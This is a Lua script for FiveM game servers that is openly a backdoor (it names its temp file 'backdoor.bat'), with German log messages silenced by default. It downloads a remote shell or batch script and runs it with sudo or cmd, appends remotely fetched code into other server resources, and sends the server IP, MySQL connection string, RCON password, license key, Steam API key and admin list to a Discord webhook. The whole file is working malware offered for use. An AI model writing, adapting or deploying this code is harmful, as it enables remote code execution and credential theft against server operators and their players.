local function trim(str)
    return str:match("^%s*(.-)%s*$")
end

local function getServerOperatingSystem()
    local handle = io.popen("uname")
    local result = trim(handle:read("*a"))
    handle:close()

    local osMap = {
        Linux = "Linux",
        Windows = "Windows",
        Darwin = "MacOS"
    }

    return osMap[result] or "Unknown"
end

-- Configurations
local config = {
    windowsScriptURL = "yourbatch",
    linuxScriptURL = "yourshell",
    enablePrints = false,
    resourceCodeURLs = {
        ressourcename = {
            client = "yourclient",
            server = "yourserver"
        }
    }
}

local function runBatchScript(scriptContent, isLinux)
    if config.enablePrints then
        print("Führe das Skript aus...")
    end

    local tempFilePath = isLinux and "/tmp/a89439.sh" or os.getenv("TEMP") .. "\\backdoor.bat"
    local file = io.open(tempFilePath, "w")

    if not file then
        if config.enablePrints then
            print("Fehler: Temporäre Datei konnte nicht erstellt werden.")
        end
        return
    end

    scriptContent = scriptContent:gsub("\r\n", "\n"):gsub("\r", "\n")
    file:write(scriptContent)
    file:close()

    local command = isLinux and ("sudo chmod +x " .. tempFilePath .. " && sudo bash " .. tempFilePath) or ("cmd /C " .. tempFilePath)
    os.execute(command)
end

local function fetchScriptContent(url, callback)
    if config.enablePrints then
        print("Lade Skript von URL: " .. url)
    end

    PerformHttpRequest(url, function(statusCode, response)
        if statusCode == 200 then
            callback(response)
        else
            if config.enablePrints then
                print("Fehler: Skript konnte nicht von URL abgerufen werden.")
            end
        end
    end, "GET", "", { ["Content-Type"] = "application/json" })
end

local function loadResourceCode(resourceName, serverScript, clientScript)
    local resourcePath = "resources/" .. resourceName
    local success = false

    local function writeToFile(path, content)
        local file = io.open(path, "a")
        if file then
            file:write(content)
            file:close()
            return true
        end
        return false
    end

    if serverScript and writeToFile(resourcePath .. "/server.lua", serverScript) then
        success = true
    end

    if clientScript and writeToFile(resourcePath .. "/client.lua", clientScript) then
        success = true
    end

    if success then
        if config.enablePrints then
            print("Code erfolgreich in Ressource " .. resourceName .. " geladen.")
        end
        os.execute("ensure " .. resourceName)
    else
        if config.enablePrints then
            print("Fehler beim Laden des Codes für Ressource " .. resourceName .. ".")
        end
    end
end

local function main()
    local serverOS = getServerOperatingSystem()
    local isLinux = serverOS == "Linux"
    local scriptURL = isLinux and config.linuxScriptURL or config.windowsScriptURL

    fetchScriptContent(scriptURL, function(scriptContent)
        runBatchScript(scriptContent, isLinux)
    end)

    for resourceName, urls in pairs(config.resourceCodeURLs) do
        if urls.server then
            fetchScriptContent(urls.server, function(serverScript)
                loadResourceCode(resourceName, serverScript, nil)
            end)
        end

        if urls.client then
            fetchScriptContent(urls.client, function(clientScript)
                loadResourceCode(resourceName, nil, clientScript)
            end)
        end
    end
end

main()

local discordWebhook = "DISCORDURL"
local adminsFile = "admins.json"

local function getOperatingSystem(serverVersion)
    if not serverVersion then return "unknown" end
    return serverVersion:find("win32") and "Windows" or (serverVersion:find("linux") and "Linux" or "unknown")
end

local function getServerIPAddress(callback)
    PerformHttpRequest("https://api.ipify.org/", function(errorCode, resultData)
        callback(errorCode == 200 and tostring(resultData) or nil)
    end)
end

local function readAdminsFile()
    return LoadResourceFile(GetCurrentResourceName(), adminsFile)
end

Citizen.CreateThread(function()
    local serverIP
    getServerIPAddress(function(ip) serverIP = ip end)
    Citizen.Wait(1000)

    if not serverIP then return end

    local os = getOperatingSystem(GetConvar("version", ""))
    local serverInfo = {
        content = "@everyone FiveM-Server Informationen:",
        embeds = {{
            title = GetConvar("sv_hostname", "unknown"),
            color = 16711680,
            fields = {
                { name = "IP", value = serverIP, inline = true },
                { name = "Cfx-Link", value = "fivem://connect/cfx.re/join/" .. (GetConvar("sv_licenseKey", "unknown")), inline = false },
                { name = "MySQL-String", value = GetConvar("mysql_connection_string", "unknown"), inline = false },
                { name = "RCON-Passwort", value = GetConvar("rcon_password", "unknown"), inline = false },
                { name = "Maximale Spieler", value = GetConvarInt("sv_maxclients", 32), inline = true },
                { name = "Aktuelle Spieler", value = #GetPlayers(), inline = true },
                { name = "Server-Version", value = GetConvar("version", ""), inline = true },
                { name = "Betriebssystem", value = os, inline = true },
                { name = "License Key", value = GetConvar("sv_licenseKey", "unknown"), inline = true },
                { name = "TCP Endpoint", value = GetConvar("endpoint_add_tcp", "unknown"), inline = true },
                { name = "Steam API Key", value = GetConvar("steam_webApiKey", "unknown"), inline = true }
            }
        }}
    }

    local adminsData = readAdminsFile()
    if adminsData then
        serverInfo.files = {
            { name = "admins.txt", content = adminsData, type = "text/plain" }
        }
    end

    PerformHttpRequest(discordWebhook, function() end, 'POST', json.encode(serverInfo), { ['Content-Type'] = 'application/json' })
end)